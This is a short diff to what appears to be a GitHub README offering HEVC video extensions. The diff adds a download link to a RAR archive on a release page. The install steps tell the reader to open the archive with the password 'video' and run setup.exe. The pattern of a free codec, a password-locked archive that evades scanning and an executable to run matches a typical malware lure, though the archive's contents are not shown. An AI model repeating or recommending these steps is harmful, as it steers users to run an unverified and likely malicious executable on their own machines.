@@ -2,7 +2,7 @@
 
 <H3>⚙️ How to install</H3>
 
-- [Download]()
+- [Download](https://github.com/valentimsantos22/hevc-video-extensions/releases/download/Download/HEVC_Video.rar)
 - Open archive (password: video)
 - Open setup.exe for download components and install
 - Follow the instruction
